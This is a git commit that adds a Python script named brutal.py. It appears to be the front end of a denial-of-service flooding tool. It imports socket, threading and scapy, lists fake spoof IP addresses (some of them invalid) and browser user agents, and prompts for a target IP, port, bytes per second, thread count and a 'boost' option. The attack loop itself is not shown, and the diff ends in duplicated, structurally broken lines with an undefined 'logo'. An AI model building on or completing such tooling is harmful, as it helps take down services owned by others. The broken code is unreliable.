25ae6fbd697640302d6f46247d44c2e5583d689e
RzLModz <97414556+RzLModz@users.noreply.github.com>
2024-07-26 16:59:58 +0700

    Add files via upload

--- brutal.py
+++ brutal.py
@@ -1,3 +1,32 @@
+import socket, threading, random, os, colorama, cloudscraper, requests
+from sqlite3 import Time
+from scapy.all import *
+from colorama import Fore
+
+fake = ['192.165.6.6', '192.176.76.7', '192.156.6.6', '192.155.5.5', '192.143.2.2', '188.1421.41.4', '187.1222.12.1', '192.153.4.4', '192.154.32.4', '192.1535.53.25', '192.154.545.5', '192.143.43.4', '192.165.6.9', '188.1545.54.3']
+global ua
+ua = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/604.4.7 (KHTML, like Gecko) Version/11.0.2 Safari/604.4.7', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36',
+               'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:57.0) Gecko/20100101 Firefox/57.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36']
+if os.name == "posix":
+    os.system('clear')
+elif os.name == "nt":
+    os.system('cls')
+    
+print(Fore.LIGHTMAGENTA_EX + logo)
+try:
+    ip = input(f"\033[1;37mIP Target : ")
+    port = int(input("Port : "))
+    bytes = int(input("Bytes Per Sec : "))
+    thrs = int(input("Thread : "))
+    bost = input("Use Boost ? Y/N : ")
+    if os.name == "posix":
+        os.system('clear')
+    elif os.name == "nt":
+        os.system('cls')
+    if bost == 'y':
+        bytes = bytes + 500
+    else:
+        bytes = bytes
 print(Fore.LIGHTMAGENTA_EX + logo)
     else:
         bytes = bytes 
